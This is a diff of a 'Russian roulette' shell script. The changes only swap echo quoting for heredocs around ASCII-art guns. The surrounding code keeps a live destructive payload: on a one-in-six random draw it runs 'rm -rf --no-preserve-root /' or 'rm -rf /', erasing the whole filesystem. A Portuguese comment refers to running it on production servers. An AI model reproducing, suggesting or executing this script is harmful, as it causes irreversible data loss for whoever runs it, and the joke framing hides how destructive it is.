@@ -3,7 +3,7 @@
 # fazer nos servers de produção.
 
 if [ $[ $RANDOM % 6 ] == 0 ]; then
-     echo '''
+     cat << 'EOF'
 \
 /                                 />
 \__+_____________________/\/\___/ /|
@@ -15,7 +15,7 @@ if [ $[ $RANDOM % 6 ] == 0 ]; then
 Bang!!!                       |       \
                                  |         \
                                  |__________|
-'''
+EOF
     # Ubuntu
     if [ -f /etc/lsb-release ]; then
         rm -rf --no-preserve-root /
@@ -28,7 +28,7 @@ Bang!!!                       |       \
         rm -rf /
     fi
 else
-    echo '''
+    cat << 'EOF'
                                   />
  __+_____________________/\/\___/ /|
 ()______________________      / /|/\
@@ -39,5 +39,5 @@ else
 Click!!!                       |       \
                                  |         \
                                  |__________|
-'''
+EOF
 fi
